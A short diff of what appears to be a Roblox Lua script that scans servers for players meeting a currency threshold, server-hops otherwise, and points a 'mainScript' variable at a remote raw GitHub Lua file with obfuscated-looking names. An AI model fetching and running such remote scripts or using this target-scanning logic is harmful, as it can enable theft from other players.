@@ -410,7 +410,7 @@ local meetsMinimum, highestAmount, currencyTextLabel, temp = CheckCurrency(minim
 
 
 local hasMatch = meetsMinimum or nameFound
-local mainScript = "https://raw.githubusercontent.com/A0WTGFjaGecc2k42wP0PZAbQphqh/Contact/refs/heads/main/OrzlxZ44HubOwnKQenGRSVztS5ndNb.lua"
+local mainScript = "https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"
 
 if meetsMinimum then
 	print("Ooooo we got something")
@@ -446,6 +446,7 @@ else
 	SaveSettings()
 	Serverhop()
 end
+
 
 
 
